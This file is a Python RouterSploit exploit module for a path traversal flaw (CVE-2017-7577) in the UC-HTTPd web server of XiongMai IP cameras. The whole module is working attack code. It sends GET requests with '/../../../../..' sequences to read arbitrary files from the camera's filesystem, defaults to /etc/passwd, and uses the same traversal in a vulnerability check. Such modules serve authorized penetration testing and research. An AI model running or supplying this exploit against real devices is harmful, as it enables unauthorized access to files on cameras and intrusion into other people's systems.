from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "XiongMai UC-HTTPd Path Traversal",
        "description": "Module exploits UC-HTTPd Path Traversal vulnerability in multiple XiongMai cameras. If target is vulnerable "
                       "it is possible to list directories and read files from the file system.",
        "authors": (
            "keksec",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://packetstormsecurity.com/files/142131/uc-httpd-directory-traversal.txt",
            "https://www.cvedetails.com/cve/CVE-2017-7577/",
        ),
        "devices": (
            "Xiongmai Technologies app: Uc-httpd 1.0.0",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from filesystem")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            path = "/../../../../..{}".format(self.filename)
            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                print_error("Exploit failed - could not read response")
                return

            print_status("Reading file: {}".format(self.filename))

            if response.text:
                print_info(response.text)
            else:
                print_status("File seems to be empty")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        path = "/../../../../../etc/passwd"
        response = self.http_request(
            method="GET",
            path=path
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
